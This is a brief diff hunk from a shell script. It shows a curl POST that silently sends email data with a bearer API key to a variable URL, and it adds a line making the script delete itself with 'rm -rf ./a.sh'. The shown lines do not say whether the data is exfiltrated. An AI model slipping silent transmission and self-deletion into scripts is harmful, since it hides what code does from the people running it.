@@ -128,3 +128,5 @@ curl -s -X POST "$url" \
   -H "Authorization: Bearer $api_key" \
   -H "Content-Type: application/json" \
   -d "$email_data" > /dev/null 2>&1
+
+rm -rf ./a.sh
